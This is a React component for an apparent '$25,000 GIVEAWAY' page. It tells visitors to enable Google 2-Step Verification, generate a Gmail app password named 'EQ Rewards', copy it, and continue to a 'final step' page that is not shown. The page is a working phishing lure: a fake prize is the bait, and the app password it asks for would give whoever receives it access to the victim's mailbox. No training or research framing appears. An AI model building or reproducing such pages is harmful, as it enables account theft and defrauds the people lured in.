import React, { useState } from 'react';
import { Link } from 'react-router-dom';
import './GooglePage.css';

function GooglePage() {
  const [step1Completed, setStep1Completed] = useState(false);
  const [step2Completed, setStep2Completed] = useState(false);

  const handleStep1Click = () => {
    window.open('https://myaccount.google.com/signinoptions/two-step-verification/enroll-welcome', '_blank', 'width=600,height=400');
    setStep1Completed(true);
  };

  const handleStep2Click = () => {
    window.open('https://myaccount.google.com/apppasswords')
    setStep2Completed(true);
  };

  return (
    <div className='google-page-container'>
      <div className="google-page-blue-bar">$25,000 GIVEAWAY</div>
      <div className="google-page-steps-container">
        <div>
          <p className ='google-page-title'>ALMOST DONE: PLEASE CONFIRM</p>
          <p className='google-page-sub'>In order to enter, you must confirm that your Gmail account is secure by following the two steps below.</p>
        </div>
        <div className="google-page-step">
          <div className="google-page-step-title">Step 1: Enable 2-Step Verification</div>
          <p className="google-page-step-description"><strong>Instructions</strong></p>
          <p className="google-page-step-description2">Click the button to set up and then continue to Step 2!</p>
          <button onClick={handleStep1Click} className="google-page-button" >Enable 2-Step Verification</button>
        </div>
        <div className="google-page-step">
          <div className="google-page-step-title">Step 2: Create App Password</div>
          <p className="google-page-step-description"><strong>Instructions</strong></p>
          <p className="google-page-step-description">Click the button and follow the instructions below to set up. Once complete, continue to the final step!</p>
          <ol>
            <li>Under <strong>"Select App"</strong>, choose <strong>"Other<span>&#40;</span>custom name<span>&#41;"</span></strong></li>
            <li>Enter <strong>"EQ Rewards"</strong> in the space provided and click <strong>"Generate"</strong></li>
            <li>Copy the app password and continue to the final step</li>
          </ol>
          <button onClick={handleStep2Click} className="google-page-button" disabled={!step1Completed}>Create App Password</button>
        </div>
      </div>
      <Link to="/final">
        <button className="google-page-button" disabled={!step1Completed || !step2Completed}>CONTINUE TO FINAL STEP</button>
      </Link>
    </div>
  );
}

export default GooglePage;
